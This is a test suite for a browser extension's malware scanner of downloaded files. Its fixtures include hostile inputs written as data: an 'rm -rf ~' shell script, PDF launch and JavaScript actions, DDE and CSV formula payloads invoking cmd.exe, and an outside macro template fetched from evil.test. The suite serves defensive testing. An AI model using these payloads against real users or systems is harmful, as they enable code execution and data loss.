// Malware checks on downloaded files (extension/scan.js). Fake files only.
// Rule since 0.10.0: only types that can be checked completely are saved; any check that cannot finish refuses the file.
// Run: node --test tests/scan.test.mjs
import test from "node:test";
import assert from "node:assert/strict";
import { scanner, sniff, PROGRAM, isProgramName, pdfDeepCheck, officeDeepCheck, deepCheck, imageDims, safeToDecode } from "../extension/scan.js";
import { deflateSync, deflateRawSync } from "node:zlib";

const B = (...parts) => new Uint8Array(Buffer.concat(parts.map((p) => (typeof p === "string" ? Buffer.from(p, "latin1") : Buffer.from(p)))));
const check = (bytes, name, mime, chunk = 1 << 20) => {
  const sc = scanner();
  for (let i = 0; i < bytes.length; i += chunk) sc.push(bytes.subarray(i, i + chunk));
  return sc.finish(name, mime);
};
// full check as media.js does it: stream scan, then the deep check for PDF / Office
const full = async (bytes, name, mime = "") => {
  const r = check(bytes, name, mime);
  if (r.block) return r.block.code;
  if (r.deep) { const b = await deepCheck(r.deep, bytes); if (b) return b.code; }
  return null;
};
// a small real ZIP; entries are stored or deflated; options: encrypted flag, unicode-path extra field
function zip(entries, { encrypted = false, deflate = false, upath = null } = {}) {
  const local = [], central = []; let off = 0;
  for (const [name, data] of entries) {
    const n = Buffer.from(name), raw = Buffer.from(data), d = deflate ? deflateRawSync(raw) : raw;
    let extra = Buffer.alloc(0);
    if (upath && upath[name]) { const u = Buffer.from(upath[name]); extra = Buffer.alloc(9 + u.length); extra.writeUInt16LE(0x7075, 0); extra.writeUInt16LE(5 + u.length, 2); extra[4] = 1; u.copy(extra, 9); }
    const h = Buffer.alloc(30), c = Buffer.alloc(46);
    h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(encrypted ? 1 : 0, 6); h.writeUInt16LE(deflate ? 8 : 0, 8); h.writeUInt32LE(d.length, 18); h.writeUInt32LE(raw.length, 22); h.writeUInt16LE(n.length, 26);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(encrypted ? 1 : 0, 8); c.writeUInt16LE(deflate ? 8 : 0, 10); c.writeUInt32LE(d.length, 20); c.writeUInt32LE(raw.length, 24);
    c.writeUInt16LE(n.length, 28); c.writeUInt16LE(extra.length, 30); c.writeUInt32LE(off, 42);
    local.push(h, n, d); central.push(c, n, extra); off += 30 + n.length + d.length;
  }
  const cd = Buffer.concat(central), end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10); end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
  return new Uint8Array(Buffer.concat([...local, cd, end]));
}
const CT = ["[Content_Types].xml", '<?xml version="1.0"?><Types><Default Extension="xml" ContentType="application/xml"/></Types>'];
const DOCX = (...more) => zip([CT, ["word/document.xml", "<w:document/>"], ...more]);
const JPEG = B([0xff, 0xd8, 0xff, 0xe0], "\0\x10JFIF\0", Buffer.alloc(200));
const PNG = B([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], Buffer.alloc(100));
const MP4 = B([0, 0, 0, 0x18], "ftypisom", Buffer.alloc(300));
const pdfWith = (dict, body) => B("%PDF-1.7\n1 0 obj " + dict.replace("%L", String(body.length)) + "\nstream\n", body, "\nendstream\nendobj\n%%EOF");

test("normal files pass and keep their name", async () => {
  for (const [bytes, name, mime, real] of [[JPEG, "photo.jpg", "image/jpeg", "jpeg"], [MP4, "clip.mp4", "video/mp4", "video"], [B("OggS", Buffer.alloc(80)), "voice.ogg", "audio/ogg", "audio"],
    [B("%PDF-1.7\n1 0 obj << /Type /Catalog >>"), "quote.pdf", "application/pdf", "pdf"], [B("name,price\nA,1\n"), "list.csv", "text/csv", "text"],
    [DOCX(), "offer.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "office"]]) {
    const r = check(bytes, name, mime);
    assert.equal(r.block, null, name); assert.equal(r.real, real, name); assert.equal(r.saveName, name, name);
    assert.equal(await full(bytes, name, mime), null, name);
  }
});

test("a missing or wrong extension is replaced by the real one", () => {
  assert.equal(check(PNG, "", "image/png").saveName, "file.png");
  assert.equal(check(B("%PDF-1.4\n<<>>"), "报价", "application/pdf").saveName, "报价.pdf");
  assert.equal(check(MP4, "clip", "video/mp4").saveName, "clip.mp4");
});

test("programs are refused by content, whatever the name says", () => {
  for (const head of [B("MZ", Buffer.alloc(100)), B([0x7f, 0x45, 0x4c, 0x46], Buffer.alloc(60)), B([0xcf, 0xfa, 0xed, 0xfe], Buffer.alloc(60)), B([0xca, 0xfe, 0xba, 0xbe], Buffer.alloc(60)), B("#!/bin/sh\nrm -rf ~"), B("dex\n035\0", Buffer.alloc(60)), B([0x4c, 0, 0, 0, 1, 0x14, 2, 0], Buffer.alloc(60))]) {
    for (const [name, mime] of [["holiday.jpg", "image/jpeg"], ["invoice.pdf", "application/pdf"], ["", "video/mp4"], ["notes.txt", "text/plain"]]) {
      const sc = scanner(); sc.push(head);
      assert.equal(sc.early(name)?.code, "PROGRAM_FILE", `${name} ${head[0]}`);
      assert.equal(sc.finish(name, mime).block.code, "PROGRAM_FILE");
    }
  }
  assert.equal(check(B("#!AMR\n", Buffer.alloc(40)), "", "audio/amr").block, null); // AMR voice starts with #! too
});

test("program names are refused, in every path part", () => {
  for (const n of ["setup.exe", "Setup.EXE", "run.sh", "x.js", "a.html", "page.htm", "f.svg", "app.dmg", "pay.apk", "doc.docm", "book.xlsm", "help.chm", "link.lnk", "photo.jpg.scr", "a.iso", "p.py",
    "remote.rdp", "fix.diagcab", "notes.one", "app.jnlp", "q.iqy", "s.slk", "x.wsc", "y.sct", "invoice.pdf.vbs", "a.scptd", "k.msu", "db.accdb", "t.themepack", "s.searchconnector-ms"]) assert.ok(PROGRAM.test(n), n);
  for (const n of ["photo.jpg", "doc.docx", "book.xlsx", "clip.mp4", "a.pdf", "voice.ogg", "notes.txt", "firmware.bin"]) assert.ok(!PROGRAM.test(n), n);
  assert.ok(isProgramName("Photos.app/Contents/MacOS/run"));
  assert.ok(isProgramName("evil.exe. "));
});

test("archives, old Office, RTF and SVG are never saved", async () => {
  for (const [bytes, name] of [[zip([["a.txt", "x"]]), "files.zip"], [B("Rar!\x1a\x07\0", Buffer.alloc(50)), "a.rar"], [B([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c], Buffer.alloc(40)), "a.7z"],
    [B([0x1f, 0x8b, 8], Buffer.alloc(40)), "a.gz"], [B(Buffer.alloc(257), "ustar\0", Buffer.alloc(300)), "a.tar"], [B([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1], Buffer.alloc(500)), "a.doc"],
    [B("{\\rtf1 hello}"), "a.rtf"], [B("{\\rt hello}"), "letter.txt"], [B('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>'), "logo.png"]]) {
    const code = await full(bytes, name);
    assert.ok(["TYPE_NOT_ALLOWED", "DISGUISED", "PROGRAM_FILE"].includes(code), `${name}: ${code}`);
  }
  // a zipped Mac app with no extension inside is still an archive: refused
  assert.equal(await full(zip([["Photos.app/Contents/MacOS/Photos", "\xcf\xfa\xed\xfe"]]), "photos.zip"), "TYPE_NOT_ALLOWED");
  // a zip named .docx without Office parts is refused by the deep check
  assert.equal(await full(zip([["readme.txt", "x"]]), "offer.docx"), "NOT_CHECKABLE");
});

test("web pages are refused even when named .txt, and code is seen anywhere in a text file", () => {
  for (const s of ["<!DOCTYPE html><html><body>login</body></html>", "﻿<html><script>steal()</script>", "  <script>alert(1)</script>", "<div><iframe src=x></iframe></div>"]) {
    assert.equal(check(B(Buffer.from(s)), "info.txt", "text/plain").block?.code, "WEB_PAGE", s);
  }
  const xml = B('<?xml version="1.0"?><invoice>', "x".repeat(5000), '<h:script xmlns:h="http://www.w3.org/1999/xhtml">steal()</h:script></invoice>');
  assert.equal(check(xml, "invoice.xml", "text/xml", 1000).block?.code, "WEB_PAGE");
  const txt = B("hello\n".repeat(2000), "<scr", "ipt>x()</script>");
  const cut = txt.length - 14, sc = scanner(); sc.push(txt.subarray(0, cut)); sc.push(txt.subarray(cut));
  assert.equal(sc.finish("notes.txt", "text/plain").block?.code, "WEB_PAGE");
  assert.equal(check(B('<?xml version="1.0"?><invoice><total>5</total></invoice>'), "invoice.xml", "text/xml").block, null);
});

test("disguised files are refused: name and content disagree", () => {
  const a = check(PNG, "contract.pdf", "application/pdf");
  assert.equal(a.block?.code, "DISGUISED"); assert.match(a.block.en, /a PDF.*PNG image/);
  assert.equal(check(JPEG, "notes.txt", "").block?.code, "DISGUISED");
});

test("an archive hidden after a picture or PDF is refused", () => {
  const z = zip([["evil.exe", "MZ"]]);
  assert.equal(check(B(JPEG, z), "photo.jpg", "image/jpeg").block?.code, "HIDDEN_ARCHIVE");
  assert.equal(check(B("%PDF-1.4\n<<>>\n", z), "a.pdf", "").block?.code, "HIDDEN_ARCHIVE");
  // bytes that only look like the end of an archive (wrong comment length) are not a false alarm
  assert.equal(check(B(JPEG, "PK\x05\x06", Buffer.alloc(18), "junk"), "photo.jpg", "image/jpeg").block, null);
});

test("PDF: dangerous actions are refused, plain or hidden, every way the reviewers found", async () => {
  const bad = async (bytes, why) => assert.equal(await full(bytes, "a.pdf", "application/pdf"), "DANGEROUS_PDF", why);
  await bad(B("%PDF-1.4\n<< /Type /Action /S /Launch /F (cmd.exe) >>"), "plain launch");
  await bad(B("%PDF-1.4\n<< /S /L#61unch >>"), "#-escaped name");
  await bad(B("%PDF-1.4\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>"), "plain JS");
  await bad(B("%PDF-1.4\n<< /EmbeddedFiles << /Names [(a) 2 0 R] >> >>"), "attached file");
  await bad(B("%PDF-1.4\n<< /XFA 5 0 R >>"), "XFA form");
  await bad(B("%PDF-1.4\n<< /S /SubmitForm /F (https://x.test) >>"), "submit form");
  await bad(B("junk before the header\n%PDF-1.4\n<< /S /Launch >>"), "header not at byte 0");
  const js = Buffer.from("<< /S /JavaScript /JS (app.alert(1)) >>");
  await bad(pdfWith("<< /Length %L /Filter /FlateDecode >>", deflateSync(js)), "flate stream");
  await bad(pdfWith("<< /Length %L /Filter /FlateDecode /DecodeParms << /Predictor 1 >> >>", deflateSync(js)), "nested DecodeParms dict");
  await bad(pdfWith("<< /Length %L /Fil#74er /Fl#61teDecode >>", deflateSync(js)), "#-escaped filter name");
  await bad(pdfWith("<< /Length %L /Filter /ASCIIHexDecode >>", Buffer.from(js.toString("hex") + ">")), "ASCIIHex");
  await bad(pdfWith("<< /Length %L /Filter [/ASCIIHexDecode /FlateDecode] >>", Buffer.from(deflateSync(js).toString("hex") + ">")), "filter chain");
  await bad(pdfWith("<< /Length %L /Filter /FlateDecode /Producer (" + "x".repeat(3000) + ") >>", deflateSync(js)), "long dict");
  // PNG predictor: every row starts with a filter byte; the keyword only appears after undoing it
  const cols = 8, rows = [];
  for (let i = 0; i < js.length; i += cols) { const r = Buffer.alloc(cols + 1); r[0] = 0; js.copy(r, 1, i, Math.min(js.length, i + cols)); rows.push(r); }
  await bad(pdfWith(`<< /Length %L /Filter /FlateDecode /DecodeParms << /Predictor 12 /Columns ${cols} >> >>`, deflateSync(Buffer.concat(rows))), "PNG predictor");
  // stream keyword followed by a lone CR
  await bad(B("%PDF-1.7\n<< /Length 99 /Filter /FlateDecode >>stream\r", deflateSync(js), "\nendstream"), "stream\\r");
});

test("PDF: what cannot be fully checked is refused, a clean PDF is saved", async () => {
  const nc = async (bytes, why) => assert.equal(await full(bytes, "a.pdf"), "NOT_CHECKABLE", why);
  const bad_ = async (bytes) => assert.equal(await full(bytes, "a.pdf"), "DANGEROUS_PDF", "damaged stream");
  await nc(B("%PDF-1.4\n<< /Encrypt 3 0 R >>"), "encrypted");
  await nc(pdfWith("<< /Length %L /Filter /LZWDecode >>", Buffer.from("xxxx")), "unknown filter");
  await nc(pdfWith("<< /Length %L /Filter /FlateDecode /DecodeParms << /Predictor 2 >> >>", deflateSync(Buffer.from("abc"))), "TIFF predictor");
  // a damaged stream is read as far as it goes, like PDF readers do
  await bad_(pdfWith("<< /Length %L /Filter /FlateDecode >>", deflateSync(Buffer.from("<< /S /JavaScript /JS (x) >>" + "y".repeat(2000))).subarray(0, 40)));
  assert.equal((await deepCheck("pdf", new Uint8Array(51 * 1024 * 1024)))?.code, "NOT_CHECKABLE");
  const ok = pdfWith("<< /Length %L /Filter /FlateDecode >>", deflateSync(Buffer.from("BT /F1 12 Tf (hello) Tj ET")));
  const okr = await pdfDeepCheck(ok); assert.equal(okr.bad, false); assert.equal(okr.partial, false);
  assert.equal(await full(ok, "a.pdf"), null);
  // compressed font / picture bytes that happen to contain "/JS" are not a false alarm
  assert.equal(await full(pdfWith("<< /Length %L /Filter /FlateDecode >>", deflateSync(Buffer.from("\x01\x02/JS\xe8\x00binary font data"))), "a.pdf"), null);
  assert.equal(await full(pdfWith("<< /Length %L >>", Buffer.from("\x01\x02/JS\xe8\x00raw")), "a.pdf"), null);
  // photos inside a PDF are not unpacked (and do not block)
  assert.equal(await full(pdfWith("<< /Length %L /Filter /DCTDecode >>", JPEG), "a.pdf"), null);
});

test("Office: macros, embedded objects and outside templates are refused, however they are hidden", async () => {
  const m = async (bytes, why) => assert.equal(await full(bytes, "offer.docx"), "MACRO_FILE", why);
  await m(DOCX(["word/vbaProject.bin", "x"]), "vbaProject");
  await m(DOCX(["word/renamed.dat", B([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1], Buffer.alloc(50))]), "OLE content under another name");
  await m(DOCX(["word/embeddings/oleObject1.bin", "x"]), "embedding");
  await m(DOCX(["word/activeX/activeX1.xml", "<x/>"]), "ActiveX");
  await m(zip([["[Content_Types].xml", '<Types><Override ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>'], ["word/document.xml", "<w/>"]]), "macro content type");
  await m(DOCX(["word/_rels/settings.xml.rels", '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.test/t.dotm" TargetMode="External"/></Relationships>']), "outside template");
  await m(DOCX(["word/payload.exe", "MZ"]), "program part");
  await m(DOCX(["word/data.dat", "MZ\x90\0"]), "program content");
  await m(zip([CT, ["word/document.xml", "<w/>"], ["word/vbaProject.bin", "x"]], { deflate: true }), "deflated parts");
  await m(zip([CT, ["word/document.xml", "<w/>"], ["word/a.xml", "x"]], { upath: { "word/a.xml": "word/vbaProject.bin" } }), "unicode name field");
  await m(zip([CT, ["xl/workbook.xml", "<w/>"], ["xl/macrosheets/sheet1.xml", "<x/>"]]), "Excel 4 macro sheet");
  assert.equal(await full(zip([CT, ["word/document.xml", "<w/>"]], { encrypted: true }), "offer.docx"), "NOT_CHECKABLE", "encrypted parts");
  const xlsx = zip([CT, ["xl/workbook.xml", "<w/>"], ["xl/printerSettings/printerSettings1.bin", "x"]]);
  assert.equal(await full(xlsx, "book.xlsx"), null, "printer settings are harmless");
  assert.equal(await full(zip([CT, ["word/document.xml", "<w/>"]], { deflate: true }), "offer.docx"), null, "clean deflated docx");
  assert.deepEqual(await officeDeepCheck(DOCX()), { bad: false, partial: false, why: "" });
});

test("sniff knows common WhatsApp types", () => {
  assert.equal(sniff(B([0, 0, 0, 0x1c], "ftypavif")), "avif");
  assert.equal(sniff(B([0, 0, 0, 0x1c], "ftypheic")), "heic");
  assert.equal(sniff(B([0, 0, 0, 0x1c], "ftypM4A ")), "audio");
  assert.equal(sniff(B([0, 0, 0, 0x1c], "ftyp3gp4")), "video");
  assert.equal(sniff(B("RIFF\0\0\0\0WEBPVP8 ")), "webp");
  assert.equal(sniff(B("ID3\x03")), "audio");
  assert.equal(sniff(B("GIF89a")), "gif");
  assert.equal(sniff(B("PK\x07\x08")), "zip");
  assert.equal(sniff(B("BZh91AY")), "gz");
});

test("images: size is read before decoding, GIF frames count too", () => {
  const png = (w, h) => { const b = Buffer.alloc(33); Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(b); b.writeUInt32BE(13, 8); b.write("IHDR", 12); b.writeUInt32BE(w, 16); b.writeUInt32BE(h, 20); return new Uint8Array(b); };
  assert.deepEqual(imageDims(png(640, 480)), { w: 640, h: 480 });
  assert.equal(safeToDecode(png(640, 480)), true);
  assert.equal(safeToDecode(png(60000, 60000)), false);
  const jpg = new Uint8Array(Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 4, 0, 0, 0xff, 0xc0, 0, 11, 8, 0x01, 0xe0, 0x02, 0x80, 3, 1, 1, 1]));
  assert.deepEqual(imageDims(jpg), { w: 640, h: 480 });
  assert.equal(safeToDecode(new Uint8Array(Buffer.from("RIFF0000AVIF"))), false);
  // a 1x1 GIF screen with a 65535x65535 frame inside
  const g = Buffer.alloc(13 + 10 + 2); g.write("GIF89a", 0); g.writeUInt16LE(1, 6); g.writeUInt16LE(1, 8); g[10] = 0;
  g[13] = 0x2c; g.writeUInt16LE(0, 14); g.writeUInt16LE(0, 16); g.writeUInt16LE(65535, 18); g.writeUInt16LE(65535, 20); g[22] = 0; g[23] = 2; g[24] = 0;
  assert.equal(safeToDecode(new Uint8Array(g)), false);
});

// ---------- third review ----------
test("a PDF stuffed with fake stream markers is refused quickly instead of freezing the extension", async () => {
  const pdf = B("%PDF-1.7\n", ">>stream\n".repeat(400000));
  const t0 = performance.now();
  assert.equal(await full(pdf, "a.pdf"), "NOT_CHECKABLE");
  assert.ok(performance.now() - t0 < 5000, `took ${performance.now() - t0} ms`);
});

test("CSV / TSV with formulas or commands is refused; ordinary numbers are fine", () => {
  for (const t of ["=cmd|'/c calc'!A1,x\n", "name,total\nA,=1+1\n", "a\t@SUM(1)\n", "a,\"=HYPERLINK(\"\"x\"\")\"\n", "x,-2+3+cmd|' /C calc'!A0\n", "ok\n\t=1+1\n", "a,ｂ\nb,＝1+1\n"])
    assert.equal(check(B(Buffer.from(t)), "budget.csv", "text/csv").block?.code, "SPREADSHEET_FORMULA", JSON.stringify(t));
  assert.equal(check(B("=1+1\n"), "data.tsv", "").block?.code, "SPREADSHEET_FORMULA");
  assert.equal(check(B("item,price,change\nA,1.50,-5\nB,+60.1,3%\nC, -0.5 ,x\n"), "list.csv", "text/csv").block, null);
  assert.equal(check(B("=not a sheet\n"), "notes.txt", "text/plain").block, null); // not opened by Excel
  // a formula split across two pieces
  const big = B("a,b\n".repeat(5000), "x,=cmd|'/c calc'!A1\n"), at = big.length - 10, sc = scanner();
  sc.push(big.subarray(0, at)); sc.push(big.subarray(at));
  assert.equal(sc.finish("a.csv", "text/csv").block?.code, "SPREADSHEET_FORMULA");
});

test("PDF names followed by NUL, GoToR, and objects inside raw stream bytes are caught", async () => {
  assert.equal(await full(pdfWith("<< /Length %L >>", Buffer.from("x /Launch\0 y")), "a.pdf"), "DANGEROUS_PDF");
  assert.equal(await full(B("%PDF-1.4\n<< /S /GoToR /F (\\\\\\\\evil\\\\x.pdf) >>"), "a.pdf"), "DANGEROUS_PDF");
  assert.equal(await full(pdfWith("<< /Length %L >>", Buffer.from("7 0 obj << /S /JavaScript /JS (x) >> endobj")), "a.pdf"), "DANGEROUS_PDF");
});

test("Office DDE fields and DDE formulas are refused, even when Word splits the field", async () => {
  const m = async (bytes, why) => assert.equal(await full(bytes, "offer.docx"), "MACRO_FILE", why);
  await m(DOCX(["word/footer1.xml", '<w:p><w:r><w:instrText> DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\\\windows\\\\cmd.exe "/c calc"</w:instrText></w:r></w:p>']), "split DDEAUTO");
  await m(DOCX(["word/header1.xml", '<w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://x.test/a.png&quot; "/>']), "outside picture");
  assert.equal(await full(zip([CT, ["xl/workbook.xml", "<w/>"], ["xl/worksheets/sheet1.xml", "<c><f>cmd|' /C calc'!A0</f></c>"]]), "book.xlsx"), "MACRO_FILE");
  assert.equal(await full(zip([CT, ["xl/workbook.xml", "<w/>"], ["xl/externalLinks/externalLink1.xml", '<externalLink><ddeLink ddeService="cmd"/></externalLink>']]), "book.xlsx"), "MACRO_FILE");
  assert.equal(await full(zip([CT, ["xl/workbook.xml", "<w/>"], ["xl/worksheets/sheet1.xml", "<c><f>SUM(A1:A3)</f></c>"]]), "book.xlsx"), null);
  assert.equal(await full(DOCX(["word/x.xml", '<w:instrText> HYPERLINK "https://x.test" </w:instrText><w:instrText> PAGE </w:instrText>']), "offer.docx"), null);
});
